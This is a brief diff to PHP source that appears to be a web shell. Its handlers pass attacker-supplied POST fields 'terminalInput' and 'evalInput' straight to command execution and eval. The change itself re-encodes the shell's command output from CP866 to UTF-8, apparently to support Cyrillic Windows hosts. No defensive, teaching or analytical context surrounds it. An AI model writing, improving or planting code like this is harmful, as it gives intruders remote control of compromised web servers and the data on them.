@@ -391,7 +391,7 @@ elseif(isset($p['viewFileorFolder'])){
 	output('error');
 }
 elseif(isset($p['terminalInput'])){
-	output(html_safe(execute($p['terminalInput'])));
+	output(iconv('CP866', 'utf-8', html_safe(execute($p['terminalInput']))));
 }
 elseif(isset($p['evalInput']) && isset($p['evalType'])){
 	$evalInput = $p['evalInput'];
